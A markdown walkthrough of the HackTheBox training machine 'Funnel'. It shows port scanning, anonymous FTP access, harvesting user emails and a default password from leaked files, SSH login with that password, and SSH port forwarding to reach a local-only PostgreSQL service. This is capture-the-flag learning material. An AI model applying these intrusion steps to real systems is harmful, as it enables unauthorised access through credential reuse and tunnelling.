---
title: Walkthrough - A HackTheBox machine - Funnel 
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - walkthrough
  - postgresql
  - ftp
---

#  Walkthrough - A HackTheBox machine - Funnel 

Enumerate port/services:

```bash
nmap -sV -sC $ip -Pn -p-
```

Open ports: [21](21-ftp.md)  and [22](22-ssh.md).

We can log into ftp with anonymous user:

```
ftp $ip
# enter user when prompted: anonymous
# Press enter when prompted for password.
```

In the ftp service there is a directory, mail_backup. 

```ftp
cd mail_backup
mget *
```

Get users from file welcome_28112022

- optimus@funnel.htb 
- albert@funnel.htb 
- andreas@funnel.htb 
- christine@funnel.htb 
- maria@funnel.htb

Get default password from file password_policy.pdf: "funnel123#!#".

You can use [hydra](hydra.md) or try out manually to access. Finally user with default password is christine:

```
sshpass -p 'funnel123#!#' ssh christine@10.129.228.102
```

Now we can enumerate socket connections with the command "ss"

```bash
ss -tl
#-l: Display only listening sockets.
#-t: Display TCP sockets.
```

Results:

```
State  Recv-Q Send-Q Local Address:Port       Peer Address:PortProcess 
LISTEN 0      4096   127.0.0.53%lo:domain          0.0.0.0:*           
LISTEN 0      128          0.0.0.0:ssh             0.0.0.0:*           
LISTEN 0      4096       127.0.0.1:postgresql      0.0.0.0:*           
LISTEN 0      4096       127.0.0.1:33599           0.0.0.0:*           
LISTEN 0      32                 *:ftp                   *:*           
LISTEN 0      128             [::]:ssh                [::]:* 
```

[postgresql](5432-postgresql.md) is in use. Since our user is not in the sudoers file and can not install a postgres client, we can bypass this situation via port forwarding.


If the tool is not installed, then run in the atacker machine:

```bash
sudo apt install postgresql-client-common
```


**1.** In the attacking machine:

```bash
ssh UserNameInTheAttackedMachine@IPOfTheAttackedMachine -L 1234:localhost:5432 
# We will listen for incoming connections on our local port 1234. When a client connects to our local port, the SSH client will forward the connection to the remote server on port 22. This allows the local client to access services on the remote server as if they were running on the local machine.
# We are forwarding traffic from any given local port, for instance 1234, to the port on which PostgreSQL is listening, namely 5432, on the remote server. We therefore specify port 1234 to the left of localhost, and 5432 to the right, indicating the target port.
```

**2.** In another terminal in the attacking machine:

```bash
sudo apt update && sudo apt install postgresql postgresql-client-common 
# this will install postgresql in case you don't have it.

psql -U christine -h localhost -p 1234
# Using our installation of psql, we can now interact with the PostgreSQL service running locally on the target machine:
# -U: to specify user.
# -h: to specify localhost. 
# -p 1234 as we are targeting the tunnel we created earlier with SSH, we need to specify which is the port the tunnel is listening on.
```

Once logged in, use [postgresql cheat sheet](5432-postgresql.md) to get the flag.


